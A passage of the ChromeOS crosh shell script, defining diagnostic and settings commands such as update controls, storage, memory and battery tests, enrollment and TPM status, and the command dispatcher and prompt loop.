        /usr/bin/update_engine_client -p2p_update=yes -show_p2p_update
        ;;

      "disable")
        /usr/bin/update_engine_client -p2p_update=no -show_p2p_update
        ;;

      "--num-connections")
        if p2p_check_enabled; then
          echo "Number of active p2p connections:"
          /usr/sbin/p2p-client --num-connections
        fi
        ;;

      "--show-peers")
        if p2p_check_enabled; then
          echo "Current p2p peers:"
          /usr/sbin/p2p-client --list-all
        fi
        ;;

      *)
        help "unknown option: $1"
        return 1
        ;;
    esac

    shift
  done
)

p2p_check_enabled() {
  if ! /usr/bin/update_engine_client -show_p2p_update 2>&1 \
    | grep -q "ENABLED"; then
    echo "Run \"p2p_update enable\" to enable peer-to-peer before" \
    "using this command."
    return 1
  fi
}

USAGE_rollback=''
HELP_rollback='
  Attempt to rollback to the previous update cached on your system. Only
  available on non-stable channels and non-enterprise enrolled devices. Please
  note that this will powerwash your device.
'
cmd_rollback() (
  if /usr/bin/update_engine_client --rollback; then
    echo "Rollback attempt succeeded -- after a couple minutes you will" \
         "get an update available and you should reboot to complete rollback."
  else
    echo "Rollback attempt failed. Check chrome://system for more information."
  fi
)

USAGE_update_over_cellular='[enable|disable]'
HELP_update_over_cellular='
  Enables or disables the auto updates over cellular networks. Run without
  arguments to see the current state.
'
cmd_update_over_cellular() (
  case "$1" in
    "enable")
      param="-update_over_cellular=yes"
      echo "When available, auto-updates download in the background any time " \
           "the computer is powered on.  Note: this may incur additional " \
           "cellular charges, including roaming and/or data charges, as per " \
           "your carrier arrangement."
      ;;

    "disable")
      param="-update_over_cellular=no"
      ;;

    "")
      param=""
      ;;

    *)
      help "unknown option: $1"
      return 1
      ;;
  esac
  /usr/bin/update_engine_client $param -show_update_over_cellular
)

USAGE_upload_crashes=''
HELP_upload_crashes='
  Uploads available crash reports to the crash server.
'
cmd_upload_crashes() (
  debugd UploadCrashes
  echo "Check chrome://crashes for status updates"
)

USAGE_upload_devcoredumps='[enable|disable]'
HELP_upload_devcoredumps='
  Enable or disable the upload of devcoredump reports.
'
cmd_upload_devcoredumps() (
  case "$1" in
    "enable")
      debugd EnableDevCoredumpUpload
      ;;

    "disable")
      debugd DisableDevCoredumpUpload
      ;;

    *)
      help "unknown option: $1"
      return 1
      ;;
  esac
)

USAGE_rlz='< status | enable | disable >'
HELP_rlz="
  Enable or disable RLZ.  See this site for details:
  http://dev.chromium.org/developers/design-documents/extensions/\
proposed-changes/apis-under-development/rlz-api
"
cmd_rlz() (
  local flag_file="$HOME/.rlz_disabled"
  local enabled=1
  local changed=0
  if [ -r "${flag_file}" ]; then
    enabled=0
  fi
  case "$1" in
    "status")
      if [ $enabled -eq 1 ]; then
        echo "Currently enabled"
      else
        echo "Currently disabled"
      fi
      return
      ;;

    "enable")
      if [ $enabled -eq 0 ]; then
        changed=1
      fi
      rm -f "${flag_file}"
      ;;

    "disable")
      if [ $enabled -eq 1 ]; then
        changed=1
      fi
      touch "${flag_file}"
      ;;

    *)
      help "unknown option: $1"
      return 1
      ;;
  esac
  if [ $changed -eq 1 ]; then
    echo "You must reboot for this to take effect."
  else
    echo "No change."
  fi
)

USAGE_syslog='<message>'
HELP_syslog='
  Logs a message to syslog (the system log daemon).
'
cmd_syslog() (
  logger -t crosh -- "$*"
)

mk_fifo() {
  local dir fifo

  # We want C-c to terminate the running test so that the UI stays the same.
  # Therefore, create a fifo to direct the output of the test to, and have a
  # subshell read from the fifo and emit to stdout. When the subshell ends (at a
  # C-c), we stop the test and clean up the fifo.
  # no way to mktemp a fifo, so make a dir to hold it instead
  dir="$(mktemp -d "/tmp/crosh-test-XXXXXXXXXX")"
  if [ $? -ne 0 ]; then
    echo "Can't create temporary directory"
    return 1
  fi
  fifo="${dir}/fifo"
  if ! mkfifo "${fifo}"; then
    echo "Can't create fifo at ${fifo}"
    return 1
  fi

  echo "${fifo}"
}

USAGE_storage_test_1=''
HELP_storage_test_1='
  Performs a short offline SMART test.
'
cmd_storage_test_1() (
  option="$1"

  debugd Smartctl "string:abort_test" >/dev/null

  test="$(debugd Smartctl "string:short_test")"
  if [ "$option" != "-v" ]; then
    echo "$test" | sed -n '1p;2p'
    echo ""
    echo "$test" | grep "Please wait"
  else
    echo "$test"
  fi

  echo ""

  while debugd Smartctl "string:capabilities" |
        grep -q "of test remaining"; do
    true
  done

  result="$(debugd Smartctl "string:selftest")"
  if [ "$option" != "-v" ]; then
    echo "$result" | grep -e "Num" -e "# 1"
  else
    echo "$result"
  fi

  debugd Smartctl "string:abort_test" >/dev/null
)

USAGE_storage_test_2=''
HELP_storage_test_2='
  Performs an extensive readability test.
'
cmd_storage_test_2() (
  debugd_poll Badblocks "fd:1"
)

USAGE_memory_test=''
HELP_memory_test='
  Performs extensive memory testing on the available free memory.
'
cmd_memory_test() (
  # Getting total free memory in KB.
  mem="$(cat /proc/meminfo | grep MemFree | tr -s " " | cut -d" " -f 2)"

  # Converting to MiB.
  mem="$(($mem / 1024))"

  # Giving OS 200MB free memory before hogging the rest of it.
  mem="$(($mem - 200))"

  debugd_poll Memtester "fd:1" "uint32:${mem}"
)

USAGE_battery_firmware='<info|check|update>'
HELP_battery_firmware='
  info   : Query battery info.
  check  : Check whether the AC adapter is connected.
           Also check whether the battery firmware is the latest.
  update : Trigger battery firmware update.
'
cmd_battery_firmware() (
  option="$1"
  case "${option}" in
    info|check)
      debugd --reply-timeout=$(( 10 * 60 * 1000 )) BatteryFirmware "string:${option}"
      echo ""
      ;;
    update)
      # Increased the reply-timeout to 10 min for Battery Firmware update process.
      # Battery Firmware Update process time includes the following:
      #   1  setup delay time before entery battery firmware update mode.
      #   2  battery flash erase time.
      #   3  data transfer time from AP to EC, and then to Batttery.
      #   4  battery flash program/write time.
      #   5  re-try time on errors.
      # Note: take ~2 min on a success battery firmware update case.
      echo ""
      echo "================================================================================"
      echo "                  Battery firmware update is in progress."
      echo "================================================================================"
      echo "Please DO NOT remove the power adapter cable, otherwise the update will fail."
      echo ""
      echo "To recover from a failed battery firmware update,"
      echo "   please plug in the power adapter cable, reboot and run this command again."
      echo ""
      echo "================================================================================"
      echo ""
      debugd --reply-timeout=$(( 10 * 60 * 1000 )) BatteryFirmware "string:${option}"
      echo ""
      ;;
    *)
      help "Unknown option: ${option}"
      ;;
  esac
)

USAGE_battery_test='[<test length>]'
HELP_battery_test='
  Tests battery discharge rate for given number of seconds. Without an argument,
  defaults to 300 seconds.
'
cmd_battery_test() (
  local test_length="$1"
  if [ -z "$test_length" ]; then
    echo "No test length specified. Defaulting to 300 seconds."
    test_length=300
  fi

  if ! check_digits "${test_length}"; then
    echo "Invalid test length."
    return 1
  fi

  if [ "$(get_power_status_field 'battery_present')" != '1' ]; then
    echo "No battery found."
    return 1
  fi

  if [ "$(get_power_status_field 'battery_discharging')" = '1' ]; then
    local bat_status='discharging'
    local bat_discharging=1
  else
    local bat_status='charging or full'
    local bat_discharging=0
  fi

  local bat_pct="$(get_power_status_field 'battery_percent')"
  local bat_full="$(get_power_status_field 'battery_charge_full')"
  local bat_full_design="$(get_power_status_field 'battery_charge_full_design')"
  local bat_health="$(echo "${bat_full}" "${bat_full_design}" | \
      awk '{ printf "%.2f", 100.0 * $1 / $2 }')"

  echo "Battery is ${bat_status} (${bat_pct}% left)"
  echo "Battery health: ${bat_health}%"

  if [ "${bat_discharging}" != '1' ]; then
    echo "Please make sure the power supply is unplugged and retry the test."
    return 1
  fi

  echo "Please wait..."
  sleep "${test_length}"

  local bat_after="$(get_power_status_field 'battery_percent')"
  local bat_diff="$(echo "${bat_pct}" "${bat_after}" | \
      awk '{ printf "%.2f", $1 - $2 }')"
  echo "Battery discharged ${bat_diff}% in ${test_length} second(s)."
)

USAGE_dump_emk=''
HELP_dump_emk='
  Show the EMK (Enterprise Machine Key).
'
cmd_dump_emk() (
  /usr/sbin/cryptohome --action=tpm_attestation_key_status \
                       --name=attest-ent-machine
)

USAGE_enroll_status='[--mode] [--domain] [--realm] [--user]'
HELP_enroll_status='
  Displays device enrollment information.
'
cmd_enroll_status() (
  if [ "$1" = "" ]; then
    if check_enterprise_mode; then
      echo "Enrollment mode:"
      /usr/sbin/cryptohome --action=install_attributes_get \
        --name=enterprise.mode
    else
      echo "This device is not enterprise enrolled."
    fi
  fi

  while [ $# -gt 0 ]; do
    case "$1" in
      "--mode")
        if check_enterprise_mode; then
          echo "Enrollment mode:"
          /usr/sbin/cryptohome --action=install_attributes_get \
            --name=enterprise.mode
        else
          echo "This device is not enterprise enrolled."
        fi
        ;;

      "--domain")
        if check_enterprise_mode; then
          echo "Enrollment domain:"
          /usr/sbin/cryptohome --action=install_attributes_get \
            --name=enterprise.domain
        else
          echo "Enterprise enrollment domain not found."
        fi
        ;;

      "--realm")
        if check_enterprise_mode; then
          echo "Enrollment realm:"
          /usr/sbin/cryptohome --action=install_attributes_get \
            --name=enterprise.realm
        else
          echo "Enterprise enrollment realm not found."
        fi
        ;;

      "--user")
        if check_enterprise_mode; then
          echo "Enrollment user:"
          /usr/sbin/cryptohome --action=install_attributes_get \
            --name=enterprise.user
        else
          echo "Enterprise enrollment user not found."
        fi
        ;;

      *)
        help "unknown option: $1"
        return 1
        ;;
    esac

    shift
  done
)

check_enterprise_mode() {
  if ! /usr/sbin/cryptohome --action=install_attributes_get \
      --name=enterprise.mode 2>&1 | grep -q "enterprise"; then
    return 1
  fi
}

USAGE_tpm_status=''
HELP_tpm_status='
  Prints TPM (Trusted Platform Module) status information.
'
cmd_tpm_status() (
  /usr/sbin/cryptohome --action=tpm_more_status
)

USAGE_cryptohome_status=''
HELP_cryptohome_status='
  Get human-readable status information from cryptohomed.
'
cmd_cryptohome_status() (
  if [ $# -eq 0 ]; then
    /usr/sbin/cryptohome --action=status
  else
    help "too many arguments"
    return 1
  fi
)

USAGE_dmesg='[-d|-k|-r|-t|-u|-w|-x]'
HELP_dmesg='
  Display kernel log buffer
'
cmd_dmesg() (
  # We whitelist only a few options.
  local opt
  for opt in "$@"; do
    if ! printf '%s' "${opt}" | grep -sqE '^-[dkrtuwx]+$'; then
      help "unknown option: $*"
      return 1
    fi
  done
  dmesg "$@"
)

USAGE_free='[options]'
HELP_free='
  Display free/used memory info
'
cmd_free() (
  # All options are harmless, so pass them through.
  free "$@"
)

USAGE_meminfo=''
HELP_meminfo='
  Display detailed memory statistics
'
cmd_meminfo() (
  if [ $# -eq 0 ]; then
    cat /proc/meminfo
  else
    help "unknown option: $*"
    return 1
  fi
)

USAGE_uptime=''
HELP_uptime='
  Display uptime/load info
'
cmd_uptime() (
  if [ $# -eq 0 ]; then
    uptime
  else
    help "unknown option: $*"
    return 1
  fi
)

USAGE_uname='[-a|-s|-n|-r|-v|-m|-p|-i|-o]'
HELP_uname='
  Display system info
'
cmd_uname() (
  # We whitelist only a few options.
  local opt
  for opt in "$@"; do
    if ! printf '%s' "${opt}" | grep -sqE '^-[asnrvmpio]+$'; then
      help "unknown option: $*"
      return 1
    fi
  done
  uname "$@"
)

USAGE_vmstat='[-a|-d|-f|-m|-n|-s|-w] [delay [count]]'
HELP_vmstat='
  Report virtual memory statistics
'
cmd_vmstat() (
  # We whitelist only a few options.
  local opt
  for opt in "$@"; do
    if ! printf '%s' "${opt}" | grep -sqE '^(-[adfmnsw]+|[0-9]+)$'; then
      help "unknown option: ${opt}"
      return 1
    fi
  done
  vmstat "$@"
)

EXEC_ccd_pass='/usr/sbin/gsctool'
HELP_ccd_pass="
  When prompted, set or clear CCD password (use the word 'clear' to clear
  the password).
"
USAGE_ccd_pass=''
cmd_ccd_pass() (
  "${EXEC_ccd_pass}" -t -P
)

EXEC_verify_ro='/usr/share/cros/cr50-verify-ro.sh'
HELP_verify_ro="
  Verify AP and EC RO firmware on a Chrome OS device connected over SuzyQ
  cable, if supported by the device.
"
USAGE_verify_ro=''
cmd_verify_ro() (
  local cr50_image="/opt/google/cr50/firmware/cr50.bin.prod"
  local ro_db="/opt/google/cr50/ro_db"

  if [ $# -ne 0 ]; then
    help "too many arguments"
    return 1
  fi
  if [ ! -f "${cr50_image}" -o ! -d "${ro_db}" ]; then
    echo "This device can not be used for RO verification"
    return 1
  fi

  debugd_poll UpdateAndVerifyFWOnUsb \
    "fd:1" "string:${cr50_image}" "string:${ro_db}"
)

USAGE_evtest=''
EXEC_evtest='/usr/bin/evtest'
HELP_evtest='
  Run evtest in safe mode.
'
cmd_evtest() (
  if [ $# -ne 0 ]; then
    help "too many arguments"
    return 1
  else
    # --safe is "safe" mode, which will only print limited info.
    # We don't allow any other arguments now. Any attempt to enable more
    # features should go through security review first.
    "${EXEC_evtest}" --safe
  fi
)

USAGE_gesture_prop="[ devices | list <device ID> \
| get <device ID> <property name> | set <device ID> <property name> <value> ]"
HELP_gesture_prop='
  Read and change gesture properties for attached input devices. The "Enable
  gesture properties D-Bus service" flag must be enabled for this command to
  work.

  Subcommands:
    devices, devs:
      List the devices managed by the gestures library, with their numeric IDs.

    list <device ID>:
      List the properties for the device with the given ID.

    get <device ID> <property name>:
      Get the current value of a property. Property names containing spaces
      should be quoted. For example:
      $ gesture_prop get 12 "Mouse CPI"

    set <device ID> <property name> <value>:
      Set the value of a property. Values use the same syntax as dbus-send
      (https://dbus.freedesktop.org/doc/dbus-send.1.html#description), and
      should either be arrays or strings. For example:
      $ gesture_prop set 12 "Mouse CPI" array:double:500
      $ gesture_prop set 12 "Log Path" string:/tmp/foo.txt
'
cmd_gesture_prop() (
  local subcommand="$1"
  if [ $# -eq 0 ]; then
    help "no subcommand specified"
    return 1
  fi
  case "${subcommand}" in
  devices|devs|list|get|set) ;;
  *)
    help "invalid subcommand ${subcommand}"
    return 1
    ;;
  esac
  shift

  if [ "${subcommand}" = "devices" ] || [ "${subcommand}" = "devs" ]; then
    if [ $# -ne 0 ]; then
      help "too many arguments for 'devices' subcommand"
      return 1
    fi
    dbus-send --print-reply --system \
      --dest=org.chromium.GesturePropertiesService \
      /org/chromium/GesturePropertiesService \
      org.chromium.GesturePropertiesServiceInterface.ListDevices
    return
  fi

  local device_id="$1"
  if [ -z "${device_id}" ]; then
    help "missing parameter: device ID"
    return 1
  elif ! is_numeric "${device_id}"; then
    help "invalid device ID (must be a number)"
    return 1
  fi
  shift

  if [ "${subcommand}" = "list" ]; then
    dbus-send --print-reply --system \
      --dest=org.chromium.GesturePropertiesService \
      /org/chromium/GesturePropertiesService \
      org.chromium.GesturePropertiesServiceInterface.ListProperties \
      int32:"${device_id}"
    return
  fi

  # All property names contain spaces, so we need to quote them, but quotes were
  # not taken into account when splitting the command arguments, so treat the
  # remaining arguments as one string and split by the quotes.
  local property_name
  local value
  local remaining_args="$*"
  local first_char="$(substr "${remaining_args}" "0" "2")"
  if [ "${first_char}" != '"' ] && [ "${first_char}" != "'" ]; then
    property_name=$1
    value=$2
  else
    local args_without_quote="$(substr "${remaining_args}" "1")"
    local quote_2_pos="$(expr index "${args_without_quote}" "${first_char}")"
    property_name="$(substr "${args_without_quote}" "0" "${quote_2_pos}")"
    # $value will have the quote and a space at the front, so trim that.
    value="$(substr "${remaining_args}" "$((quote_2_pos + 2))")"
  fi

  case "${subcommand}" in
  get)
    if [ -n "${value}" ]; then
      help "too many arguments for 'get' subcommand"
      return 1
    fi
    dbus-send --print-reply --system \
      --dest=org.chromium.GesturePropertiesService \
      /org/chromium/GesturePropertiesService \
      org.chromium.GesturePropertiesServiceInterface.GetProperty \
      int32:"${device_id}" string:"${property_name}"
    return
    ;;
  set)
    dbus-send --print-reply --system \
      --dest=org.chromium.GesturePropertiesService \
      /org/chromium/GesturePropertiesService \
      org.chromium.GesturePropertiesServiceInterface.SetProperty \
      int32:"${device_id}" string:"${property_name}" "${value}"
    return
    ;;
  esac
)

USAGE_wifi_fw_dump=''
HELP_wifi_fw_dump='
  Manually trigger a WiFi firmware dump. This command will currently only
  complete successfully if the intel-wifi-fw-dumper package is present on the
  device with USE=iwlwifi_dump enabled.
'
cmd_wifi_fw_dump() (
  if [ $# -ne 0 ]; then
    help "too many arguments"
    return 1
  fi
  debugd WifiFWDump
)

substr() {
  local str="$1"
  local start="$2"
  local end="$3"

  start="$(expr "$start" + 1)"

  if [ ! -z "$end" ]; then
    end="$(expr "$end" - 1)"
  fi

  printf '%s' "${str}" | cut -c${start}-${end}
}

# Return true if the arg is a shell function.
is_shell_function() {
  local func="$1"
  type "${func}" 2>/dev/null | head -1 | grep -q 'function'
}

# Return all registered crosh commands intended for users.
# This will not include "hidden" commands that lack help as those are not yet
# meant for wider consumption, or they've been deprecated.
registered_visible_commands() {
  # Remember: Use a form that works under POSIX shell.  Since that does not
  # offer any way of doing introspection on registered functions, we have to
  # stick to probing the environment.
  set | grep -o '^HELP_[^=]*' | sed -e 's:^HELP_::' -e 's:=$::' | sort
}

# Return true if the first arg is a valid crosh command.
registered_crosh_command() {
  local command="$1"
  is_shell_function "cmd_${command}"
}

# Return true if the specified command has a custom help function.
registered_crosh_command_help() {
  local command="$1"
  is_shell_function "help_${command}"
}

# Return true if the first arg is a command available on
# the system. We assume that all commands that do not
# define EXEC_<command> variable are always available. For
# commands that do define EXEC_<command> variable, we
# ensure that it contains name of a valid shell command.
check_command_available() {
  local exec="$(expand_var "EXEC_$1")"
  [ -z "${exec}" ] || command -v "${exec}" >/dev/null
}

# Run a command with its args as an array.
dispatch() {
  local command="$1"
  shift
  local p

  if ! registered_crosh_command "${command}"; then
    help "unknown command: ${command}"
  elif ! check_command_available "${command}"; then
    help "command '${command}' is not available"
  else
    # Only add valid commands to the history.
    if [ -n "${LINE_}" ]; then
      shell_history -s "${LINE_}"
    fi

    # See if --help was requested; if so, handle it directly so each command
    # doesn't have to deal with it directly.
    for p in "$@"; do
      if [ "${p}" = "-h" -o "${p}" = "--help" ]; then
        cmd_help "${command}"
        return 0
      fi
    done

    # Set CURRENT_COMMAND for the `help` helper.
    CURRENT_COMMAND="${command}" "cmd_${command}" "$@"
  fi
}

# Run a command with the argv in a single string.
dispatch_line() {
  local line="$1"
  local command=""
  local params=""
  local p

  local space_pos="$(expr index "${line}" ' ')"

  if [ "${space_pos}" = "0" ]; then
    command="$line"
  else
    command="$(substr "$line" "0" "$space_pos")"
    command="${command% *}"
    params="$(substr "$line" "$space_pos")"
  fi

  dispatch "${command}" ${params}
}

repl() {
  echo "${INTRO_TEXT}"
  if [ "$IS_BASH" != "1" ]; then
    echo "Sorry, line editing and command history disabled due to" \
      "shell limitations."
  fi

  # This will be set by the 'exit' command to tell us to quit.
  local exit

  # Create a colorized prompt to make it easier to see commands start/finish.
  local prompt
  prompt="$(printf '%bcrosh>%b ' '\001\033[1;33m\002' '\001\033[0m\002')"

  while [ -z "${exit}" ]; do
    if shell_read "${prompt}" LINE_; then
      if [ ! -z "$LINE_" ]; then
        dispatch_line "$LINE_"
      fi
    else
      echo
      return 1
    fi
  done
}

usage() {
  if [ $# -ne 0 ]; then
    # Send stdout below to stderr instead.
    exec 1>&2
  fi
  cat <<EOF
Usage: crosh [options] [-- [args]]

Options:
  --dash        Force running through dash.
  --dev         Force dev mode.
  --removable   Force removable (USB) mode.
  --usb         Same as above.
  --help, -h    Show this help string.
  -- <all args after this are a command to run>
                Execute a single command and exit.
EOF
  if [ $# -ne 0 ]; then
    echo "ERROR: $*"
    exit 1
  else
    exit 0
  fi
}

main() {
  # If we aren't installed, use local files for testing.
  if [ ! -d "${CROSH_MODPATH}" ]; then
    CROSH_MODPATH="$(dirname "$0")"
    echo "Loading from local paths instead: ${CROSH_MODPATH}"
  fi

  while [ $# -gt 0 ]; do
    case $1 in
    --dash)
      # This was handled above in try_bash.
      ;;
    --dev)
      CROSH_DEVMODE="1"
      ;;
    --removable|--usb)
      CROSH_REMOVABLE="1"
      ;;
    --help|-h)
      usage
      ;;
    --)
      CROSH_SINGLE_COMMAND=1
      shift
      break
      ;;
    *)
      usage "Unknown option: $1"
      ;;
    esac
    shift
  done

  load_extra_crosh

  if [ "${CROSH_SINGLE_COMMAND}" == "1" ]; then
    # Don't trap anymore.
    trap 'exit 1' INT QUIT

    dispatch "$@"
    exit $?
  fi

  INPUTRC="${CROSH_MODPATH}/inputrc.crosh"

  shell_history_init

  repl

  # Save the history after the clean exit.
  shell_history -w "${HISTFILE}"
}
main "$@"
